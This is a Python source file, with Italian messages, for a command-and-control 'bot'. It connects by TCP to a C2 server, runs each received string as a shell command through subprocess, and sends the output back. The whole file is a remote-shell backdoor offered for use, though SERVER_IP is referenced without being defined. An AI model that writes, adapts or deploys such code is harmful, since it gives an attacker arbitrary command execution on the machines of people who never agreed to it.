import socket
import subprocess

def avvia_bot():
    SERVER_PORT = 8080

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((SERVER_IP, SERVER_PORT))
        print(f"[+] Connesso al C2 {SERVER_IP}:{SERVER_PORT}")
        
        while True:
            comando = client.recv(1024).decode()
            
            if not comando:
                break
                
            try:
                risultato = subprocess.run(comando, shell=True, capture_output=True, text=True)
                
                output = risultato.stdout + risultato.stderr
                
                if not output:
                    output = "[+] Comando eseguito senza output.\n"
                    
                client.send(output.encode())
                
            except Exception as e:
                errore = f"[-] Errore del bot nell'eseguire il comando: {str(e)}\n"
                client.send(errore.encode())
                
    except ConnectionRefusedError:
        print("[-] Server non trovato. Assicurati di aver avviato prima il server C2!")
    finally:
        client.close()

if __name__ == "__main__":
    avvia_bot()
